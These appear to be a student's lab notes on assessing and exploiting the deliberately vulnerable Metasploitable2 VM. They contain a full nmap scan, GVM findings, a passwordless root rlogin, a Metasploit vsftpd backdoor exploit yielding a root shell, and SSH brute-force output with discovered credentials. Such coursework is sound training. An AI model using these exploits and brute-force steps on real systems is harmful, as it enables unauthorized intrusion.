|_ssh-rsa AAAAB3NzaC1yc2EAAAABIwAAAQEAstqnuFMBOZvO3WTEjP4TUdjgWkIVNdTq6kboEDjteOfc65TlI7sRvQBwqAhQjeeyyIk8T55gMDkOD0akSlSXvLDcmcdYfxeIF0ZSuT+nkRhij7XSSA/Oc5QSk3sJ/SInfb78e3anbRHpmkJcVgETJ5WhKObUNf1AKZW++4Xlc63M4KI5cjvMMIPEVOyR3AKmI78Fo3HJjYucg87JjLeC66I7+dlEYX6zT8i1XYwa/L1vZ3qSJISGVu8kRPikMv/cNSvki4j+qDYyZ2E5497W87+Ed46/8P42LNGoOV8OcX/ro6pAcbEPUdUEfkJrqi2YXbhvwIJ0gFMb6wfe5cnQew==

23/tcp   open  telnet      syn-ack ttl 64 Linux telnetd

25/tcp   open  smtp        syn-ack ttl 64 Postfix smtpd
|_smtp-commands: metasploitable.localdomain, PIPELINING, SIZE 10240000, VRFY, ETRN, STARTTLS, ENHANCEDSTATUSCODES, 8BITMIME, DSN, 
| ssl-cert: Subject: commonName=ubuntu804-base.localdomain/organizationName=OCOSA/stateOrProvinceName=There is no such thing outside US/countryName=XX/organizationalUnitName=Office for Complication of Otherwise Simple Affairs/localityName=Everywhere/emailAddress=root@ubuntu804-base.localdomain
| Issuer: commonName=ubuntu804-base.localdomain/organizationName=OCOSA/stateOrProvinceName=There is no such thing outside US/countryName=XX/organizationalUnitName=Office for Complication of Otherwise Simple Affairs/localityName=Everywhere/emailAddress=root@ubuntu804-base.localdomain
| Public Key type: rsa
| Public Key bits: 1024
| Signature Algorithm: sha1WithRSAEncryption
| Not valid before: 2010-03-17T14:07:45
| Not valid after:  2010-04-16T14:07:45
| MD5:   dcd9 ad90 6c8f 2f73 74af 383b 2540 8828
| SHA-1: ed09 3088 7066 03bf d5dc 2373 99b4 98da 2d4d 31c6
| -----BEGIN CERTIFICATE-----
| MIIDWzCCAsQCCQD6+TpMf7a5zDANBgkqhkiG9w0BAQUFADCB8TELMAkGA1UEBhMC
| WFgxKjAoBgNVBAgTIVRoZXJlIGlzIG5vIHN1Y2ggdGhpbmcgb3V0c2lkZSBVUzET
| MBEGA1UEBxMKRXZlcnl3aGVyZTEOMAwGA1UEChMFT0NPU0ExPDA6BgNVBAsTM09m
| ZmljZSBmb3IgQ29tcGxpY2F0aW9uIG9mIE90aGVyd2lzZSBTaW1wbGUgQWZmYWly
| czEjMCEGA1UEAxMadWJ1bnR1ODA0LWJhc2UubG9jYWxkb21haW4xLjAsBgkqhkiG
| 9w0BCQEWH3Jvb3RAdWJ1bnR1ODA0LWJhc2UubG9jYWxkb21haW4wHhcNMTAwMzE3
| MTQwNzQ1WhcNMTAwNDE2MTQwNzQ1WjCB8TELMAkGA1UEBhMCWFgxKjAoBgNVBAgT
| IVRoZXJlIGlzIG5vIHN1Y2ggdGhpbmcgb3V0c2lkZSBVUzETMBEGA1UEBxMKRXZl
| cnl3aGVyZTEOMAwGA1UEChMFT0NPU0ExPDA6BgNVBAsTM09mZmljZSBmb3IgQ29t
| cGxpY2F0aW9uIG9mIE90aGVyd2lzZSBTaW1wbGUgQWZmYWlyczEjMCEGA1UEAxMa
| dWJ1bnR1ODA0LWJhc2UubG9jYWxkb21haW4xLjAsBgkqhkiG9w0BCQEWH3Jvb3RA
| dWJ1bnR1ODA0LWJhc2UubG9jYWxkb21haW4wgZ8wDQYJKoZIhvcNAQEBBQADgY0A
| MIGJAoGBANa0EzYzmpVxexvefIN12nGxPKl//q1kG3fpT66+ytT4y++uu0N5JHP/
| POWeO238yLGs+kxNXptMmVQL16hKULqp3h0f9ORrAqP0a0XNTK+NiWIzj2W7NmGf
| xCxzwU4uoKgUTphwRmG70bkx34yZ7nVreTxAoK6XAJCd3JkNM6S1AgMBAAEwDQYJ
| KoZIhvcNAQEFBQADgYEAkqS0uBRVYyVRSgvDKiLPOvgXagzPZqqnZS9Ibc3jPlyf
| d2zURFQfHoRPjtSN3awtiAkhqNpWLKkFPEloNRl1DNpTI4iIGS10JsEiZe4RaINq
| U0qcJ8ugtOmNKQyyPBhcZ8xTph4w0Komex6uQLkpAWwuvKIZlHwVbo0wOPbKLnU=
|_-----END CERTIFICATE-----
|_ssl-date: 2021-10-18T11:15:13+00:00; -1s from scanner time.
| sslv2: 
|   SSLv2 supported
|   ciphers: 
|     SSL2_RC2_128_CBC_EXPORT40_WITH_MD5
|     SSL2_RC4_128_WITH_MD5
|     SSL2_RC2_128_CBC_WITH_MD5
|     SSL2_DES_64_CBC_WITH_MD5
|     SSL2_RC4_128_EXPORT40_WITH_MD5
|_    SSL2_DES_192_EDE3_CBC_WITH_MD5

53/tcp   open  domain      syn-ack ttl 64 ISC BIND 9.4.2
| dns-nsid: 
|_  bind.version: 9.4.2

80/tcp   open  http        syn-ack ttl 64 Apache httpd 2.2.8 ((Ubuntu) DAV/2)
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.2.8 (Ubuntu) DAV/2
|_http-title: Metasploitable2 - Linux

111/tcp  open  rpcbind     syn-ack ttl 64 2 (RPC #100000)
| rpcinfo: 
|   program version    port/proto  service
|   100000  2            111/tcp   rpcbind
|   100000  2            111/udp   rpcbind
|   100003  2,3,4       2049/tcp   nfs
|   100003  2,3,4       2049/udp   nfs
|   100005  1,2,3      36760/tcp   mountd
|   100005  1,2,3      55824/udp   mountd
|   100021  1,3,4      34208/tcp   nlockmgr
|   100021  1,3,4      44348/udp   nlockmgr
|   100024  1          50719/udp   status
|_  100024  1          54207/tcp   status

139/tcp  open  netbios-ssn syn-ack ttl 64 Samba smbd 3.X - 4.X (workgroup: WORKGROUP)

445/tcp  open  netbios-ssn syn-ack ttl 64 Samba smbd 3.0.20-Debian (workgroup: WORKGROUP)

512/tcp  open  exec        syn-ack ttl 64 netkit-rsh rexecd

513/tcp  open  login       syn-ack ttl 64 OpenBSD or Solaris rlogind

514/tcp  open  tcpwrapped  syn-ack ttl 64

1099/tcp open  java-rmi    syn-ack ttl 64 GNU Classpath grmiregistry

1524/tcp open  bindshell   syn-ack ttl 64 Metasploitable root shell

2049/tcp open  nfs         syn-ack ttl 64 2-4 (RPC #100003)

2121/tcp open  ftp         syn-ack ttl 64 ProFTPD 1.3.1

3306/tcp open  mysql       syn-ack ttl 64 MySQL 5.0.51a-3ubuntu5
| mysql-info: 
|   Protocol: 10
|   Version: 5.0.51a-3ubuntu5
|   Thread ID: 11
|   Capabilities flags: 43564
|   Some Capabilities: Support41Auth, SupportsTransactions, SwitchToSSLAfterHandshake, LongColumnFlag, Speaks41ProtocolNew, ConnectWithDatabase, SupportsCompression
|   Status: Autocommit
|_  Salt: 9j)+>613MkR6Y>hs+x>j

5432/tcp open  postgresql  syn-ack ttl 64 PostgreSQL DB 8.3.0 - 8.3.7
| ssl-cert: Subject: commonName=ubuntu804-base.localdomain/organizationName=OCOSA/stateOrProvinceName=There is no such thing outside US/countryName=XX/organizationalUnitName=Office for Complication of Otherwise Simple Affairs/localityName=Everywhere/emailAddress=root@ubuntu804-base.localdomain
| Issuer: commonName=ubuntu804-base.localdomain/organizationName=OCOSA/stateOrProvinceName=There is no such thing outside US/countryName=XX/organizationalUnitName=Office for Complication of Otherwise Simple Affairs/localityName=Everywhere/emailAddress=root@ubuntu804-base.localdomain
| Public Key type: rsa
| Public Key bits: 1024
| Signature Algorithm: sha1WithRSAEncryption
| Not valid before: 2010-03-17T14:07:45
| Not valid after:  2010-04-16T14:07:45
| MD5:   dcd9 ad90 6c8f 2f73 74af 383b 2540 8828
| SHA-1: ed09 3088 7066 03bf d5dc 2373 99b4 98da 2d4d 31c6
| -----BEGIN CERTIFICATE-----
| MIIDWzCCAsQCCQD6+TpMf7a5zDANBgkqhkiG9w0BAQUFADCB8TELMAkGA1UEBhMC
| WFgxKjAoBgNVBAgTIVRoZXJlIGlzIG5vIHN1Y2ggdGhpbmcgb3V0c2lkZSBVUzET
| MBEGA1UEBxMKRXZlcnl3aGVyZTEOMAwGA1UEChMFT0NPU0ExPDA6BgNVBAsTM09m
| ZmljZSBmb3IgQ29tcGxpY2F0aW9uIG9mIE90aGVyd2lzZSBTaW1wbGUgQWZmYWly
| czEjMCEGA1UEAxMadWJ1bnR1ODA0LWJhc2UubG9jYWxkb21haW4xLjAsBgkqhkiG
| 9w0BCQEWH3Jvb3RAdWJ1bnR1ODA0LWJhc2UubG9jYWxkb21haW4wHhcNMTAwMzE3
| MTQwNzQ1WhcNMTAwNDE2MTQwNzQ1WjCB8TELMAkGA1UEBhMCWFgxKjAoBgNVBAgT
| IVRoZXJlIGlzIG5vIHN1Y2ggdGhpbmcgb3V0c2lkZSBVUzETMBEGA1UEBxMKRXZl
| cnl3aGVyZTEOMAwGA1UEChMFT0NPU0ExPDA6BgNVBAsTM09mZmljZSBmb3IgQ29t
| cGxpY2F0aW9uIG9mIE90aGVyd2lzZSBTaW1wbGUgQWZmYWlyczEjMCEGA1UEAxMa
| dWJ1bnR1ODA0LWJhc2UubG9jYWxkb21haW4xLjAsBgkqhkiG9w0BCQEWH3Jvb3RA
| dWJ1bnR1ODA0LWJhc2UubG9jYWxkb21haW4wgZ8wDQYJKoZIhvcNAQEBBQADgY0A
| MIGJAoGBANa0EzYzmpVxexvefIN12nGxPKl//q1kG3fpT66+ytT4y++uu0N5JHP/
| POWeO238yLGs+kxNXptMmVQL16hKULqp3h0f9ORrAqP0a0XNTK+NiWIzj2W7NmGf
| xCxzwU4uoKgUTphwRmG70bkx34yZ7nVreTxAoK6XAJCd3JkNM6S1AgMBAAEwDQYJ
| KoZIhvcNAQEFBQADgYEAkqS0uBRVYyVRSgvDKiLPOvgXagzPZqqnZS9Ibc3jPlyf
| d2zURFQfHoRPjtSN3awtiAkhqNpWLKkFPEloNRl1DNpTI4iIGS10JsEiZe4RaINq
| U0qcJ8ugtOmNKQyyPBhcZ8xTph4w0Komex6uQLkpAWwuvKIZlHwVbo0wOPbKLnU=
|_-----END CERTIFICATE-----
|_ssl-date: 2021-10-18T11:15:13+00:00; -1s from scanner time.

5900/tcp open  vnc         syn-ack ttl 64 VNC (protocol 3.3)
| vnc-info: 
|   Protocol version: 3.3
|   Security types: 
|_    VNC Authentication (2)

6000/tcp open  X11         syn-ack ttl 64 (access denied)

6667/tcp open  irc         syn-ack ttl 64 UnrealIRCd
| irc-info: 
|   users: 1
|   servers: 1
|   lusers: 1
|   lservers: 0
|   server: irc.Metasploitable.LAN
|   version: Unreal3.2.8.1. irc.Metasploitable.LAN 
|   uptime: 0 days, 2:23:03
|   source ident: nmap
|   source host: 3CC110E8.EB72D3BE.7B559A54.IP
|_  error: Closing Link: vkhivomwk[10.0.2.8] (Quit: vkhivomwk)

8009/tcp open  ajp13       syn-ack ttl 64 Apache Jserv (Protocol v1.3)
|_ajp-methods: Failed to get a valid response for the OPTION request

8180/tcp open  http        syn-ack ttl 64 Apache Tomcat/Coyote JSP engine 1.1
|_http-favicon: Apache Tomcat
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache-Coyote/1.1
|_http-title: Apache Tomcat/5.5

MAC Address: 08:00:27:4E:F5:4B (Oracle VirtualBox virtual NIC)
Device type: general purpose
Running: Linux 2.6.X
OS CPE: cpe:/o:linux:linux_kernel:2.6
OS details: Linux 2.6.9 - 2.6.33
TCP/IP fingerprint:
OS:SCAN(V=7.91%E=4%D=10/18%OT=21%CT=1%CU=42199%PV=Y%DS=1%DC=D%G=Y%M=080027%
OS:TM=616D5743%P=x86_64-pc-linux-gnu)SEQ(SP=C4%GCD=1%ISR=D4%TI=Z%CI=Z%II=I%
OS:TS=7)OPS(O1=M5B4ST11NW6%O2=M5B4ST11NW6%O3=M5B4NNT11NW6%O4=M5B4ST11NW6%O5
OS:=M5B4ST11NW6%O6=M5B4ST11)WIN(W1=16A0%W2=16A0%W3=16A0%W4=16A0%W5=16A0%W6=
OS:16A0)ECN(R=Y%DF=Y%T=40%W=16D0%O=M5B4NNSNW6%CC=N%Q=)T1(R=Y%DF=Y%T=40%S=O%
OS:A=S+%F=AS%RD=0%Q=)T2(R=N)T3(R=Y%DF=Y%T=40%W=16A0%S=O%A=S+%F=AS%O=M5B4ST1
OS:1NW6%RD=0%Q=)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R=Y%DF=Y%T=4
OS:0%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%
OS:Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%T=40%IPL=16
OS:4%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD=S)

Uptime guess: 0.096 days (since Mon Oct 18 10:56:45 2021)
Network Distance: 1 hop
TCP Sequence Prediction: Difficulty=196 (Good luck!)
IP ID Sequence Generation: All zeros
Service Info: Hosts:  metasploitable.localdomain, irc.Metasploitable.LAN; OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
|_clock-skew: mean: 59m59s, deviation: 2h00m00s, median: -1s
| nbstat: NetBIOS name: METASPLOITABLE, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
| Names:
|   METASPLOITABLE<00>   Flags: <unique><active>
|   METASPLOITABLE<03>   Flags: <unique><active>
|   METASPLOITABLE<20>   Flags: <unique><active>
|   \x01\x02__MSBROWSE__\x02<01>  Flags: <group><active>
|   WORKGROUP<00>        Flags: <group><active>
|   WORKGROUP<1d>        Flags: <unique><active>
|   WORKGROUP<1e>        Flags: <group><active>
| Statistics:
|   00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
|   00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
|_  00 00 00 00 00 00 00 00 00 00 00 00 00 00
| p2p-conficker: 
|   Checking for Conficker.C or higher...
|   Check 1 (port 22512/tcp): CLEAN (Couldn't connect)
|   Check 2 (port 54450/tcp): CLEAN (Couldn't connect)
|   Check 3 (port 7981/udp): CLEAN (Failed to receive data)
|   Check 4 (port 44857/udp): CLEAN (Failed to receive data)
|_  0/4 checks are positive: Host is CLEAN or ports are blocked
| smb-os-discovery: 
|   OS: Unix (Samba 3.0.20-Debian)
|   Computer name: metasploitable
|   NetBIOS computer name: 
|   Domain name: localdomain
|   FQDN: metasploitable.localdomain
|_  System time: 2021-10-18T07:15:04-04:00
| smb-security-mode: 
|   account_used: <blank>
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
|_smb2-security-mode: Couldn't establish a SMBv2 connection.
|_smb2-time: Protocol negotiation failed (SMB2)

TRACEROUTE
HOP RTT     ADDRESS
1   0.36 ms 10.0.2.9

NSE: Script Post-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 13:15
Completed NSE at 13:15, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 13:15
Completed NSE at 13:15, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 13:15
Completed NSE at 13:15, 0.00s elapsed
Read data files from: /usr/bin/../share/nmap
OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 23.31 seconds
           Raw packets sent: 1020 (45.626KB) | Rcvd: 1016 (41.430KB)

```

### Adding vulnerability scan

[vulnerability scan output](/mnt/26158F5879578F52/Università/Magistrale/Security_Verification_and_Testing/Labs/01Lab_VA/outputVulscan.txt)

## 2.2 Vulnerability assessement of Metasploitable2 with GVM
```
[>] Checking for GVM admin user
[*] Creating user admin for gvm
[*] Please note the generated admin password
[*] User created with password '97017e8b-7d36-4627-ba60-0aee13972703'
```
[My report](/mnt/26158F5879578F52/Università/Magistrale/Security_Verification_and_Testing/Labs/01Lab_VA/report-bd20a997-e9a4-4ad3-915f-679c0830d3cf.pdf)

- The severity column (CVSS)
'''
CVSS
Base Score
10.0 (High)
Base Vector
AV:N/AC:L/Au:N/C:C/I:C/A:C
Access Vector
NETWORK
Access Complexity
LOW
Authentication
NONE
Confidentiality Impact
COMPLETE
Integrity Impact
COMPLETE
Availability Impact
COMPLETE
'''
- Overall high insecurity!
- There are 2 "will not fix" vulnerabilities:
'''
awiki Multiple Local File Include Vulnerabilities
phpMyAdmin 'error.php' Cross Site Scripting Vulnerability
'''
## 3 Vulnerability exploitation
https://docs.rapid7.com/metasploit/metasploitable-2-exploitability-guide/
### Java RMI Server Insecure Default ConfigurationRemote Code Execution Vulnerability
```
Follow instruction, then with meterpreter you can download, upload files on the server, and more!

```
https://docs.rapid7.com/metasploit/metasploitable-2-exploitability-guide/
### NVT: rlogin Passwordless Login, NVT: The rlogin service is running
https://www.ssh.com/academy/ssh/rlogin
```
# rlogin -l root 10.0.2.9
Last login: Fri Jun  1 00:10:39 EDT 2012 from :0.0 on pts/0
Linux metasploitable 2.6.24-16-server #1 SMP Thu Apr 10 13:58:00 UTC 2008 i686
 
root@metasploitable:~#
```
### NVT: vsftpd Compromised Source Packages Backdoor Vulnerability
```
msf6 > search vsftpd

Matching Modules
================

   #  Name                                  Disclosure Date  Rank       Check  Description
   -  ----                                  ---------------  ----       -----  -----------
   0  exploit/unix/ftp/vsftpd_234_backdoor  2011-07-03       excellent  No     VSFTPD v2.3.4 Backdoor Command Execution


Interact with a module by name or index. For example info 0, use 0 or use exploit/unix/ftp/vsftpd_234_backdoor

msf6 > use 0
[*] No payload configured, defaulting to cmd/unix/interact
msf6 exploit(unix/ftp/vsftpd_234_backdoor) > show options

Module options (exploit/unix/ftp/vsftpd_234_backdoor):

   Name    Current Setting  Required  Description
   ----    ---------------  --------  -----------
   RHOSTS                   yes       The target host(s), see https://github.com/rapid7/metasploit-framework
                                      /wiki/Using-Metasploit
   RPORT   21               yes       The target port (TCP)


Payload options (cmd/unix/interact):

   Name  Current Setting  Required  Description
   ----  ---------------  --------  -----------


Exploit target:

   Id  Name
   --  ----
   0   Automatic


msf6 exploit(unix/ftp/vsftpd_234_backdoor) > set RHOSTS 10.0.2.9
RHOSTS => 10.0.2.9
msf6 exploit(unix/ftp/vsftpd_234_backdoor) > exploit

[*] 10.0.2.9:21 - Banner: 220 (vsFTPd 2.3.4)
[*] 10.0.2.9:21 - USER: 331 Please specify the password.
[+] 10.0.2.9:21 - Backdoor service has been spawned, handling...
[+] 10.0.2.9:21 - UID: uid=0(root) gid=0(root)
[*] Found shell.
[*] Command shell session 1 opened (10.0.2.8:35887 -> 10.0.2.9:6200) at 2021-10-19 16:59:14 +0200

whoami
root
```
### SSH login auxiliary module
https://www.offensive-security.com/metasploit-unleashed/scanner-ssh-auxiliary-modules/
using as user_pass file /usr/share/metasploit-framework/data/wordlists/piata_ssh_userpass.txt it finds multiple accounts
```
[*] 10.0.2.9:22 - Starting bruteforce
[+] 10.0.2.9:22 - Success: 'user:user' 'uid=1001(user) gid=1001(user) groups=1001(user) Linux metasploitable 2.6.24-16-server #1 SMP Thu Apr 10 13:58:00 UTC 2008 i686 GNU/Linux '
[*] Command shell session 1 opened (10.0.2.8:43565 -> 10.0.2.9:22) at 2021-10-19 10:28:49 +0200
[+] 10.0.2.9:22 - Success: 'postgres:postgres' 'uid=108(postgres) gid=117(postgres) groups=114(ssl-cert),117(postgres) Linux metasploitable 2.6.24-16-server #1 SMP Thu Apr 10 13:58:00 UTC 2008 i686 GNU/Linux '
[*] Command shell session 2 opened (10.0.2.8:37557 -> 10.0.2.9:22) at 2021-10-19 10:31:14 +0200
```
but takes a lot of time to try 1000!
Try dedicated tools when you have time!
